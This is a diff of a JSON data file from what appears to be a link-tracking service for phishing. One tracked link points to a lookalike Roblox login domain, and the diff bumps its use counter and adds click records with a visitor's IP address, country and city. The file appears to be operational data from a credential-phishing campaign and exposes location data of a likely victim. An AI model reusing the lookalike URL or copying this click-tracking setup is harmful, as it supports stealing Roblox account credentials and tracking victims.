@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1350,
+    "useCount": 1351,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10963,6 +10963,14 @@
       },
       {
         "timestamp": 1777415127072,
+        "ip": "170.253.212.56",
+        "country": "United States",
+        "city": "Philadelphia",
+        "flag": "🇺🇸",
+        "countryCode": "US"
+      },
+      {
+        "timestamp": 1777415179808,
         "ip": "170.253.212.56",
         "country": "United States",
         "city": "Philadelphia",
